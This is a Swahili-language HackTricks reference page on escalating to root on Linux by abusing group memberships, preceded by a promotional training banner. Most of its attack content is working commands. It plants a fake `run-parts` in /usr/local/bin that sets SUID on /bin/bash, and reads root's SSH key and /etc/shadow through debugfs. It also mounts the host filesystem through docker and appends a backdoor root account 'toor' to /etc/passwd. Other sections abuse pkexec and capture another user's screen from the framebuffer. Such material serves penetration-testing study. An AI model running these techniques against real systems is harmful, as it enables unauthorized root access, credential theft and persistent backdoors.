# Vikundi Vinavyovutia - Linux Privesc

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Vikundi vya Sudo/Admin

### **PE - Mbinu 1**

**Wakati mwingine**, **kwa chaguo-msingi (au kwa sababu fulani ya programu inahitaji)** ndani ya faili ya **/etc/sudoers** unaweza kupata baadhi ya mistari hii:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote ambaye ni mwanachama wa kikundi cha sudo au admin anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ndiyo hali, **kwa kuwa mtumiaji wa mizizi unaweza tu kutekeleza**:
```
sudo su
```
### PE - Mbinu 2

Pata binaries zote za suid na angalia kama kuna binary **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ikiwa utagundua kwamba binary **pkexec ni binary ya SUID** na wewe ni mwanachama wa **sudo** au **admin**, huenda ukaweza kutekeleza binaries kama sudo ukitumia `pkexec`.\
Hii ni kwa sababu kwa kawaida hizo ni makundi ndani ya **sera ya polkit**. Sera hii kimsingi inatambua ni makundi gani yanaweza kutumia `pkexec`. Angalia hivyo kwa:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Hapo utapata ni vikundi vipi vinaruhusiwa kutekeleza **pkexec** na **kwa chaguo-msingi** katika baadhi ya disctros za linux vikundi **sudo** na **admin** vinatokea.

Kwa **kuwa root unaweza kutekeleza**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Ikiwa unajaribu kutekeleza **pkexec** na unapata **kosa** hili:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Si kwa sababu huna ruhusa bali ni kwa sababu hujahusishwa bila GUI**. Na kuna njia ya kupita kwa tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **vikao vya ssh 2 tofauti**:

{% code title="kikao1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="kikao2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Kikundi cha Gari

**Wakati mwingine**, **kwa chaguo-msingi** ndani ya faili ya **/etc/sudoers** unaweza kupata mstari huu:
```
%wheel	ALL=(ALL:ALL) ALL
```
Hii inamaanisha kwamba **mtumiaji yeyote ambaye ni mwanachama wa kikundi cha wheel anaweza kutekeleza chochote kama sudo**.

Ikiwa hii ndiyo hali, **kutakuwa na uwezekano wa kuwa root unaweza tu kutekeleza**:
```
sudo su
```
## Kikundi cha Shadow

Watumiaji kutoka kwa **kikundi cha shadow** wanaweza **kusoma** faili ya **/etc/shadow**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Kwa hivyo, soma faili na jaribu **kuvunja baadhi ya hashes**.

## Kikundi cha Wafanyakazi

**staff**: Inaruhusu watumiaji kuongeza marekebisho ya ndani kwenye mfumo (`/usr/local`) bila kuhitaji mamlaka ya mzizi (kumbuka kwamba programu zinazoweza kutekelezwa katika `/usr/local/bin` zimo kwenye kifaa cha PATH cha mtumiaji yeyote, na wanaweza "kubadilisha" programu zinazoweza kutekelezwa katika `/bin` na `/usr/bin` zenye jina sawa). Linganisha na kikundi "adm", ambacho kina uhusiano zaidi na ufuatiliaji/usalama. [\[chanzo\]](https://wiki.debian.org/SystemGroups)

Katika mgawanyo wa debian, `$PATH` inaonyesha kuwa `/usr/local/` itatekelezwa kwa kipaumbele cha juu, iwe wewe ni mtumiaji aliye na mamlaka au la.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
### Kama tunaweza kuchukua udhibiti wa baadhi ya programu katika `/usr/local`, tunaweza kwa urahisi kupata mizizi.

Kuchukua udhibiti wa programu ya `run-parts` ni njia rahisi ya kupata mizizi, kwa sababu programu nyingi zitarudisha `run-parts` kama (crontab, wakati wa kuingia kwa ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Au Wakati wa kuingia kwa kikao kipya cha ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Tumia**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Kikundi cha Diski

Haki hii ni karibu **sawa na ufikiaji wa root** kwa sababu unaweza kupata data yote ndani ya mashine.

Faili: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Tafadhali kumbuka kwamba kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili kuiga `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Hata hivyo, ikiwa unajaribu **kuandika faili zinazomilikiwa na root** (kama vile `/etc/shadow` au `/etc/passwd`) utapata kosa la "**Ruhusa imekataliwa**".

## Kikundi cha Video

Kwa kutumia amri `w` unaweza kupata **nani ameingia kwenye mfumo** na itaonyesha matokeo kama yafuatayo:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** inamaanisha kuwa mtumiaji **yossi ameingia kimwili** kwenye terminal kwenye mashine.

Kikundi cha **video** kina ufikivu wa kuona matokeo ya skrini. Kimsingi unaweza kuchunguza skrini. Ili kufanya hivyo unahitaji **kunasa picha ya sasa kwenye skrini** kwa data ghafi na kupata azimio linalotumiwa na skrini hiyo. Data ya skrini inaweza kuokolewa kwenye `/dev/fb0` na unaweza kupata azimio la skrini hii kwenye `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Kufungua **picha ya raw** unaweza kutumia **GIMP**, chagua faili ya \*\*`screen.raw` \*\* na chagua aina ya faili **Raw image data**:

![](<../../../.gitbook/assets/image (463).png>)

Kisha badilisha Upana na Urefu kwa vile vilivyotumiwa kwenye skrini na angalia Aina tofauti za Picha (na chagua ile inayoonyesha vizuri skrini):

![](<../../../.gitbook/assets/image (317).png>)

## Kikundi cha Root

Inaonekana kwa chaguo-msingi **wanachama wa kikundi cha root** wanaweza kupata ufikiaji wa **kurekebisha** baadhi ya **faili za usanidi wa huduma** au baadhi ya **faili za maktaba** au **vitu vingine vya kuvutia** ambavyo vinaweza kutumika kwa kuboresha mamlaka...

**Angalia ni faili gani wanachama wa root wanaweza kurekebisha**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Kikundi cha Docker

Unaweza **kufunga mfumo wa faili wa mzizi wa kompyuta mwenyeji kwa kiasi cha kifaa**, hivyo wakati kifaa kinaanza mara moja hulipakia `chroot` kwenye kiasi hicho. Hii kimsingi inakupa mamlaka ya mzizi kwenye kompyuta.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Mwishowe, ikiwa hupendi mapendekezo yoyote yaliyotangulia, au hayafanyi kazi kwa sababu fulani (firewall ya docker api?) unaweza daima kujaribu **kuendesha chombo cha kipekee na kutoroka kutoka kwake** kama ilivyoelezwa hapa:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

Ikiwa una ruhusa ya kuandika juu ya soketi ya docker soma [**chapisho hili kuhusu jinsi ya kuongeza mamlaka kwa kudhuru soketi ya docker**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## Kikundi cha lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Kikundi cha Adm

Kawaida **wanachama** wa kikundi cha **`adm`** wana ruhusa ya **kusoma faili za logi** zilizoko ndani ya _/var/log/_.\
Kwa hivyo, ikiwa umedukua mtumiaji ndani ya kikundi hiki unapaswa bila shaka **kuchunguza kwa makini logi**.

## Kikundi cha Auth

Ndani ya OpenBSD kikundi cha **auth** kawaida kinaweza kuandika kwenye folda _**/etc/skey**_ na _**/var/db/yubikey**_ ikiwa zinatumika.\
Ruhusa hizi zinaweza kutumiwa vibaya na shambulio lifuatalo kwa lengo la **kuongeza mamlaka** hadi kwa root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
